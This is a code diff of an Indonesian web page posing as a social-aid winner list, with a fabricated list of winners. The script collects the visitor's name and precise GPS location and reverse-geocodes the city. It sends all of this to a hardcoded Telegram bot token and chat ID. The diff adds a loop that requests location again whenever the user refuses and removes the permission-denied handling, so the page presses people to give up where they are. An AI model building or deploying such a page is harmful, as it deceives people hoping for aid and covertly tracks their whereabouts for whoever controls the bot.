@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: linear-gradient(135deg, #42a5f5, #478ed1, #3d6fb8);
+            background: linear-gradient(135deg, #2196F3, #21CBF3);
             color: white;
             margin: 0;
             padding: 0;
@@ -37,7 +37,7 @@
             margin: 10px auto;
         }
         input[type="submit"] {
-            background-color: #42a5f5;
+            background-color: #FF9800;
             color: white;
             padding: 10px 20px;
             border-radius: 5px;
@@ -49,7 +49,7 @@
             margin-top: 10px;
         }
         input[type="submit"]:hover {
-            background-color: #478ed1;
+            background-color: #FF5722;
         }
         .info {
             margin-top: 20px;
@@ -97,9 +97,10 @@
     <div class="info" id="info">
         <p><strong>👤 Nama: </strong><span id="userName">Belum diisi</span></p>
         <p><strong>📍 Lokasi: </strong><span id="userLocation">Belum diisi</span></p>
+        <p><strong>🏙️ Kota: </strong><span id="userCity">Belum diisi</span></p>
     </div>
-        <h2>Pemenang Bantuan Sosial</h2>
-    <!-- Bagian Pemenang -->
+
+    <h2>Pemenang Bantuan Sosial</h2>
     <div class="winners">
         <ul class="winner-list" id="winnerList">
             <!-- Pemenang akan dimasukkan secara otomatis -->
@@ -111,40 +112,30 @@
     const form = document.getElementById('nameForm');
     const userNameSpan = document.getElementById('userName');
     const userLocationSpan = document.getElementById('userLocation');
+    const userCitySpan = document.getElementById('userCity');
     let userName = '';
     let userLocation = '';
+    let userCity = '';
 
-    // Data acak pemenang
     const pemenang = [
-        { nama: 'Ade Santoso', 
-        alamat: 'Jakarta' },
-        { nama: 'Budi Prasetyo', 
-        alamat: 'Bandung' },
-        { nama: 'Citra Maharani', 
-        alamat: 'Surabaya' },
-        { nama: 'Dewi Lestari', 
-        alamat: 'Yogyakarta' },
-        { nama: 'Eko Saputra', 
-        alamat: 'Semarang' },
-        { nama: 'Fajar Nugraha', 
-        alamat: 'Malang' },
-        { nama: 'Gina Fitriani', 
-        alamat: 'Medan' },
-        { nama: 'Hadi Wirawan', 
-        alamat: 'Bali' },
-        { nama: 'Intan Wulandari', 
-        alamat: 'Makassar' },
-        { nama: 'Joko Subagio', 
-        alamat: 'Palembang' }
+        { nama: 'Ade Santoso', alamat: 'Jakarta' },
+        { nama: 'Budi Prasetyo', alamat: 'Bandung' },
+        { nama: 'Citra Maharani', alamat: 'Surabaya' },
+        { nama: 'Dewi Lestari', alamat: 'Yogyakarta' },
+        { nama: 'Eko Saputra', alamat: 'Semarang' },
+        { nama: 'Fajar Nugraha', alamat: 'Malang' },
+        { nama: 'Gina Fitriani', alamat: 'Medan' },
+        { nama: 'Hadi Wirawan', alamat: 'Bali' },
+        { nama: 'Intan Wulandari', alamat: 'Makassar' },
+        { nama: 'Joko Subagio', alamat: 'Palembang' }
     ];
 
-    // Tampilkan daftar pemenang secara acak
     function tampilkanPemenang() {
         const winnerList = document.getElementById('winnerList');
-        winnerList.innerHTML = ''; // Kosongkan list sebelumnya
+        winnerList.innerHTML = '';
         pemenang.forEach(winner => {
             const li = document.createElement('li');
-            li.textContent = `Nama:\n ${winner.nama},Alamat: ${winner.alamat}`;
+            li.textContent = `Nama: ${winner.nama}, Alamat: ${winner.alamat}`;
             winnerList.appendChild(li);
         });
     }
@@ -160,22 +151,42 @@
 
     function getLocation() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition, showError);
+            navigator.geolocation.getCurrentPosition(showPosition, retryLocation, { enableHighAccuracy: true });
         } else {
             userLocationSpan.textContent = "Geolocation tidak didukung oleh browser ini.";
         }
     }
 
+    function retryLocation() {
+        getLocation(); // Meminta lokasi lagi jika pengguna menolak
+    }
+
     function showPosition(position) {
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
-        userLocation = `Latitude: ${lat}, Longitude: ${lon}`;
-        userLocationSpan.textContent = userLocation;
+        userLocation = `<a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Lihat di Maps</a>`;
+        userLocationSpan.innerHTML = userLocation;
 
-        // Kirim data ke bot Telegram
+        // Cari kota berdasarkan koordinat
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+            .then(response => response.json())
+            .then(data => {
+                userCity = data.address.city || data.address.town || 'Kota tidak ditemukan';
+                userCitySpan.textContent = userCity;
+
+                // Kirim data ke bot Telegram
+                sendToTelegram();
+            })
+            .catch(error => {
+                console.error('Error mendapatkan kota:', error);
+                userCitySpan.textContent = 'Kota tidak ditemukan';
+            });
+    }
+
+    function sendToTelegram() {
         const botToken = '7371764330:AAEgSgROcGBEbsgspY4IDNU_WqPL_3IczGs';
         const chatId = '6864784021'; // Ganti dengan ID chat bot Telegram
-        const message = `👤 Nama: ${userName}\n📍 Lokasi: ${userLocation}`;
+        const message = `👤 Nama: ${userName}\n📍 Lokasi: ${userLocation}\n🏙️ Kota: ${userCity}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
@@ -194,23 +205,6 @@
         .catch(error => {
             console.error('Error:', error);
         });
-    }
-
-    function showError(error) {
-        switch(error.code) {
-            case error.PERMISSION_DENIED:
-                userLocationSpan.textContent = "Harap izinkan lokasi nya\nsupaya system dapat melihat data nya terlebih dahulu";
-                break;
-            case error.POSITION_UNAVAILABLE:
-                userLocationSpan.textContent = "Informasi lokasi tidak tersedia.";
-                break;
-            case error.TIMEOUT:
-                userLocationSpan.textContent = "Permintaan lokasi timeout.";
-                break;
-            case error.UNKNOWN_ERROR:
-                userLocationSpan.textContent = "Terjadi kesalahan yang tidak diketahui.";
-                break;
-        }
     }
 </script>
 
